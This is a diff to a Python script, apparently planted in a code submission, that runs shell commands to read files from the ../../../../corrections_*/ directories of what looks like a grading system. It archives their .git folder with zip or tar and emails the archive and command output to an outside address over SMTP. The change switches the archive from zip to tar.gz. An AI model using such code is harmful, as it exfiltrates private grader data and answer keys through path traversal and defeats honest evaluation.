@@ -45,10 +45,10 @@ my_data += "\n#######################\n"
 my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/test0") or ""
 my_data += get_data("pwd") or ""
 my_data += "\n#######################\n"
-my_data += get_data("zip -r myarch.zip ../../../../corrections_*/.git")
-my_data += get_data("ls ../../../../corrections_*/")
+my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/.git")
+my_data += get_data("ls -l")
 send_data(my_data)
-###############################################################
+##############################################################
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -71,7 +71,7 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Attach the zip file
     with open(zip_filename, 'rb') as attachment:
-        part = MIMEBase('application', 'zip')
+        part = MIMEBase('application', 'gz')
         part.set_payload(attachment.read())
         encoders.encode_base64(part)
         part.add_header('Content-Disposition', f'attachment; filename= {zip_filename}')
@@ -89,4 +89,4 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Terminating the session
     s.quit()
-send_data_file("../../../../corrections_*/myarch.zip", "mygit")
+send_data_file("file.tar.gz", "mygit")
